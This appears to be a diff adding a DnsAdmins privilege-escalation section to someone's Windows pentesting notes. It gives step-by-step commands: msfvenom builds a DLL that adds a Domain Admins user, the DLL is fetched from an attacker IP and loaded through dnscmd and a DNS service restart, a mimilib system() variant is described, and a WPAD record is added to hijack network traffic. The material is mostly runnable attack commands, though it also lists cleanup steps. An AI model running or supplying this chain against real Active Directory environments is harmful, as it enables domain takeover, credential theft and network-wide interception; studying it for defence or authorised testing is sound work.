@@ -1192,7 +1192,7 @@ c:\inetpub\wwwroot\web.config
 
 ---
 
-# 🪪 Windows Built-in Groups & SeBackupPrivilege Abuse
+# 🪪 Windows Built-in Groups
 
 
 ## 🔹 Overview
@@ -1426,5 +1426,193 @@ Reading the *Security* log with `Get-WinEvent` requires:
   HKLM\System\CurrentControlSet\Services\Eventlog\Security
   ```
 * **Event Log Readers membership alone is NOT enough.**
+
+---
+
+# 📝 DnsAdmins 
+
+## 🔍 Overview
+
+* **DnsAdmins** group members can manage DNS settings in Active Directory environments.
+* Windows DNS supports **custom DNS plugins (DLLs)** for extended resolution logic.
+* The DNS service runs as **NT AUTHORITY\SYSTEM**, meaning a loaded DLL runs with SYSTEM privileges.
+* If DNS is hosted on a **Domain Controller (common setup)**, this can lead to **full domain compromise**.
+
+## ⚠️ Why DnsAdmins Is Dangerous
+
+1. **DNS management occurs via RPC**.
+2. The registry key
+   `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll`
+   defines a plugin DLL path.
+3. **dnscmd.exe** allows DnsAdmins members to set this DLL path **without validation**.
+4. When DNS is restarted:
+
+   * The DLL is loaded as SYSTEM.
+   * Arbitrary code execution → privilege escalation to Domain Admin.
+
+This allows:
+
+* Reverse shells
+* Credential dumping (Mimikatz DLL)
+* Adding users to Domain Admins
+
+
+## 🧪 Attack Walkthrough
+
+### 1. Generate Malicious DLL
+
+Example: add a user to Domain Admins.
+
+```bash
+msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' \
+  -f dll -o adduser.dll
+```
+
+### 2. Host DLL on an HTTP server
+
+```bash
+python3 -m http.server 7777
+```
+
+### 3. Download DLL to the DNS server
+
+```powershell
+wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
+```
+
+
+## 🛂 Permissions Testing
+
+### Load DLL as non-privileged user (fails)
+
+```cmd
+dnscmd.exe /config /serverlevelplugindll C:\path\adduser.dll
+```
+
+→ **ERROR_ACCESS_DENIED**
+
+### Verify DnsAdmins membership
+
+```powershell
+Get-ADGroupMember -Identity DnsAdmins
+```
+
+### Load DLL as DnsAdmins member (works)
+
+```cmd
+dnscmd.exe /config /serverlevelplugindll C:\path\adduser.dll
+```
+
+→ Registry key successfully set.
+
+
+
+## 🔁 Forcing DLL Execution (Service Restart)
+
+DnsAdmins members may have service-level permissions to **start/stop DNS**.
+
+### 1. Find user SID
+
+```cmd
+wmic useraccount where name="netadm" get sid
+```
+
+### 2. Check DNS service permissions
+
+```cmd
+sc.exe sdshow DNS
+```
+
+Look for **RPWP** (SERVICE_START + SERVICE_STOP).
+
+### 3. Stop DNS service
+
+```cmd
+sc stop dns
+```
+
+### 4. Start DNS service (loads DLL)
+
+```cmd
+sc start dns
+```
+
+### 5. Confirm escalation
+
+```cmd
+net group "Domain Admins" /dom
+```
+
+
+## 🧹 Cleanup Procedure (IMPORTANT)
+
+Only perform cleanup with admin privileges.
+
+### 1. Check registry for malicious DLL reference
+
+```cmd
+reg query \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
+```
+
+### 2. Delete ServerLevelPluginDll value
+
+```cmd
+reg delete \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters \
+  /v ServerLevelPluginDll
+```
+
+### 3. Restart DNS service
+
+```cmd
+sc.exe start dns
+```
+
+### 4. Check service status
+
+```cmd
+sc query dns
+```
+
+## 🧩 Mimilib.dll Method (Alternate Execution)
+
+Mimikatz includes **mimilib.dll**, which can be modified to run arbitrary commands via `system()` in the DNS query handler.
+
+Example code snippet:
+
+```c
+system("ENTER COMMAND HERE");
+```
+
+Useful for:
+
+* Reverse shells
+* Command execution on query
+* Credential harvesting
+
+
+## 🌐 WPAD Record Attack (DnsAdmins Abuse #2)
+
+DnsAdmins members can:
+
+* Disable the **Global Query Block List**
+* Add a **WPAD** record
+
+This enables **network-wide traffic hijacking** using tools like:
+
+* Responder
+* Inveigh
+
+### 1. Disable Query Block List
+
+```powershell
+Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.domain.local
+```
+
+### 2. Add WPAD DNS record
+
+```powershell
+Add-DnsServerResourceRecordA -Name wpad -ZoneName domain.local \
+  -ComputerName dc01.domain.local -IPv4Address 10.10.14.3
+```
 
 ---
